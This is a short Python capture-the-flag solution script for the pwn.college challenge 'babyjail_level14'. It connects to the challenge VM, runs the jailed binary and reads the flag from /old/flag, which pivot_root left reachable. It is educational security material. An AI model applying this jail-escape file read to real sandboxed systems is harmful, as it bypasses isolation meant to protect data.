def exploit():  # This script connects to a VM, executes the 'babyjail_level14' binary, and reads the flag from the location where the program moves the flag.
   
    child = pexpect.spawn('vm connect')  # Launch the 'vm connect' command to connect to the VM (obtained from analyzing the .c file)

    child.expect(r'Last login:', timeout=60)  # Wait for the "Last login:" message indicating that the connection is established
    
    time.sleep(5)  # Pause for 5 seconds to ensure the connection is fully established and send the command to execute the challenge binary
    child.sendline('/challenge/babyjail_level14')  # From the .c file, we know the program allows us to execute it in the VM, not locally
    
    child.expect(r'bash-5.0# ', timeout=60)  # Wait for the bash prompt in the jail environment and send the command to read the flag
    child.sendline('cat /old/flag')  # Similarly, from the .c file, we know the flag is moved to this directory by 'pivot_root'
    
    child.expect(r'pwn\.college\{.*?\}', timeout=60)  # Wait for and extract the flag in the pwn.college{...} format
    flag = child.after.decode().strip()  # Decode and strip any extra whitespace from the flag
    
    print(f'Flag: {flag}')  # Print the flag

    child.sendline('exit')  # Exit the VM
    child.close()  # Close the connection

if __name__ == "__main__":
    exploit()  # Execute the exploit function
